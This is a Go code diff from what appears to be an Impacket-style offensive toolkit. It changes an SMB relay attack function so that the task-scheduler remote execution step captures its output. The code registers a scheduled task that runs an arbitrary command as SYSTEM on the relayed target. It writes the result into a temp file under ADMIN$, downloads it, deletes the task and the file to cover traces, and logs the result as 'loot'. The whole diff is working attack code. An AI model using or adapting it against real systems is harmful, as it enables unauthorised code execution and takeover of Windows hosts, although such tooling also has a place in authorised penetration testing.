@@ -179,15 +179,23 @@ func tschExecAttack(client *SMBRelayClient, cfg *Config) error {
 
 	ts := tsch.NewTaskScheduler(rpcClient)
 
+	// The task writes its output to a target temp file; reading it back proves
+	// the command actually executed (Impacket behavior).
+	outFile := fmt.Sprintf("gopacketout%04x.tmp", rand.Intn(0xFFFF))
+	remoteOut := "Temp\\" + outFile // relative to ADMIN$ (= %SystemRoot%)
+
+	rl := &runLog{}
+	rl.Printf("[*] Executing command on target via Task Scheduler...")
+
 	// Generate random task name (matches Impacket pattern)
 	taskName := fmt.Sprintf("\\gopacket%04x", rand.Intn(0xFFFF))
 
 	// Build task XML (matches Impacket's XML template)
 	// Runs as SYSTEM with HighestAvailable run level
-	taskXML := buildTaskXML(cfg.Command)
+	taskXML := buildTaskXML(fmt.Sprintf("%s > %%SystemRoot%%\\%s 2>&1", cfg.Command, remoteOut))
 
 	if build.Debug {
-		log.Printf("[D] TschExec: registering task %s", taskName)
+		rl.Printf("[D] TschExec: registering task %s", taskName)
 	}
 
 	// Register task
@@ -196,28 +204,49 @@ func tschExecAttack(client *SMBRelayClient, cfg *Config) error {
 		return fmt.Errorf("register task: %v", err)
 	}
 
-	log.Printf("[*] Task %s registered successfully", actualPath)
+	rl.Printf("[*] Task %s registered successfully", actualPath)
 
 	// Run task
 	if err := ts.Run(actualPath); err != nil {
-		log.Printf("[-] Task run returned: %v", err)
+		rl.Printf("[-] Task run returned: %v", err)
 	} else {
-		log.Printf("[*] Task executed")
+		rl.Printf("[*] Task executed")
 	}
 
-	// Wait briefly for execution, then clean up (matches Impacket behavior)
-	time.Sleep(2 * time.Second)
+	// Wait for the task to write its output, then download it.
+	var output []byte
+	found := false
+	for i := 0; i < 20; i++ {
+		time.Sleep(500 * time.Millisecond)
+		if data, derr := client.DownloadFile("ADMIN$", remoteOut); derr == nil {
+			output = data
+			found = true
+			break
+		}
+	}
 
 	// Delete task
 	if err := ts.Delete(actualPath); err != nil {
-		log.Printf("[-] Warning: failed to delete task %s: %v", actualPath, err)
+		rl.Printf("[-] Warning: failed to delete task %s: %v", actualPath, err)
 	} else {
-		log.Printf("[*] Task %s deleted", actualPath)
+		rl.Printf("[*] Task %s deleted", actualPath)
 	}
 
-	openCommandLoot(cfg, hostFromAddr(client.TargetAddr), "tschexec", cfg.Command)
-	commandLootf("[+] Command executed via Task Scheduler: %s", cfg.Command)
-	closeCommandLoot()
+	if found {
+		if err := client.DeleteFile("ADMIN$", remoteOut); err != nil {
+			rl.Printf("[-] Warning: could not delete %s on target: %v", remoteOut, err)
+		}
+	} else {
+		rl.Printf("[-] No output file from target (%s) — command did not execute", remoteOut)
+		return fmt.Errorf("command did not execute on %s (no output file %s)", cfg.TargetAddr, remoteOut)
+	}
+
+	if len(output) > 0 {
+		rl.Printf("[+] Command output:\n%s", strings.TrimRight(string(output), "\r\n"))
+	} else {
+		rl.Printf("[*] Command executed (no output)")
+	}
+	rl.Flush(cfg, hostFromAddr(client.TargetAddr), "tschexec", cfg.Command)
 
 	return nil
 }
